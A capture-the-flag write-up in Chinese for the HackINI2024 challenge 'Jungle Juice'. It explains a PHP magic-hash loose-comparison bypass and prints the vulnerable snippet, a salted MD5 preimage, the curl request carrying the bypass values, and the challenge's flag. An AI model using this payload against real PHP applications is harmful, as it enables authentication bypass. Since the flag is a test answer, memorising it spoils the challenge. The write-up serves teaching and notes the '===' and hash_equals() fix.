# HackINI2024 Jungle Juice

## 题目简述

PHP 程序把用户输入 `hash` 加上固定盐 `1237` 后计算 MD5，再把用户输入 `choice` 与随机整数拼接，最后使用宽松比较 `==` 判断两者是否相等。目标是构造两边都被 PHP 当成科学计数法零值的字符串，绕过不可预测的随机数。

## 解题过程

关键代码为：

```php
$salted_hash = hash('md5', '1237' . $hash);
$r = gen_random();

if ($choice . $r == $salted_hash) {
    echo getFlag();
}
```

MD5 输入 `1237PLtBEM6` 的结果是：

```text
0e101753759710895202182204836980
```

它符合 `0e` 后全是数字的形式。在 PHP 宽松数值比较中，该字符串会被解释为 $0\times10^n=0$。令 `choice=0e`，与任意正整数 `$r` 拼接后同样得到 `0e<纯数字>`，也被转换为数值 0。随机数具体是多少因此不再重要。

提交表单：

```bash
curl 'http://TARGET/index.php' \
  --data 'choice=0e&hash=PLtBEM6'
```

两边在 `==` 下相等，页面输出：

```text
shellmates{PHP_1$s$S$s$_W3EEEeEeEeeeEE3E33eEEE3EE33ee333e1Rd}
```

## 方法总结

以 `0e` 开头且其余全为数字的哈希常被称为 magic hash。它只有在 PHP 宽松比较触发数值类型转换时才产生绕过效果；若使用 `===` 或 `hash_equals()` 比较字符串，就不会把两边当成零。利用时还必须把固定盐纳入原像计算，本题有效的是 `md5("1237" + "PLtBEM6")`。
